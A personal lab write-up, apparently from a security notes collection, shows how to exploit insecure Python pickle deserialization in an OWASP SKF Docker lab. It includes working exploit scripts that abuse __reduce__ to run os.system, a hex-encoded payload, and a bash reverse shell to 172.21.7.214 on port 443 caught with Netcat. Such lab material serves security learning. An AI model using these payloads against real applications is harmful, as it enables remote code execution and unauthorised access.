---
tags:
  - vulnerabilty
  - "#deserializationpickle"
  - python
---
# What is Pickle?

Is a module for serializing (pickling) and deserializing (unpickling) Python objects

---

# Exploiting

Open the browser localhost:5000

![](../../Images/Pasted%20image%2020230906202717.png)

The data that we put in the form is keeping in a variable named **att**

The problem is that **there isn't any type of sanitization**, you can see the code in **/python/DES-Pickle/DES-Pickle.py**

![](../../Images/Pasted%20image%2020230906203747.png)

In Pickle there are a function that is named `___reduce__` that you can indicate how do you like to deserialize or what action to do

Normally to do this attack you have to create a file, in this case we are going to named his **exploitation.py**

````python
#!/usr/bin/python3

import pickle
import os
import binascii

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('id',))

if __name__ == '__main__':
    print(pickle.dumps(Exploit()))

````

`binascii` --> We are going to use this library to represent the string in hexadecimal

`__reduce__` --> Special method to personality how deserialized an object 

`'id',` --> This is for represent a tupla (similar that a list) with only one element and not a string

`pickle.dumps()` --> To show in console the serialized data

If you execute the program you are going to see a lot of bytes, but this have to be in hexadecimal:

![](../../Images/Pasted%20image%2020230906205807.png)

Remember we know that is in hexadecimal because we see in the source code

To represent in hexadecimal you can use the library **binascii**

````python
#!/usr/bin/python3

import pickle
import os
import binascii

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('id',))

if __name__ == '__main__':
    print(binascii.hexlify(pickle.dumps(Exploit())))

````

![](../../Images/Pasted%20image%2020230906205952.png)

The string is between single quotes

````bash
8004951d000000000000008c05706f736978948c0673797374656d9493948c02696494859452942e
````

Now you can introduce this in the website

![](../../Images/Pasted%20image%2020230906210103.png)

But what happen?

This code has been executed but don't show the output (normally is the status code)

To verify if the command is well executing we can listen in port 443 (with [Netcat](../../Tools/Netcat.md))

And put a [Reverse shells](../../Shells/Reverse%20shell/Reverse%20shells.md) in our exploit:

````python
#!/usr/bin/python3

import pickle
import os
import binascii

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('bash -c "bash -i >& /dev/tcp/172.21.7.214/443 0>&1"',))

if __name__ == '__main__':
    print(binascii.hexlify(pickle.dumps(Exploit())))

````

We gain access!!

![](../../Images/Pasted%20image%2020230906210558.png)



---

# Labs

> sudo docker pull blabla1337/owasp-skf-lab:des-pickle

> sudo docker run -dit -p 127.0.0.1:5000:5000 blabla1337/owasp-skf-lab:des-pickle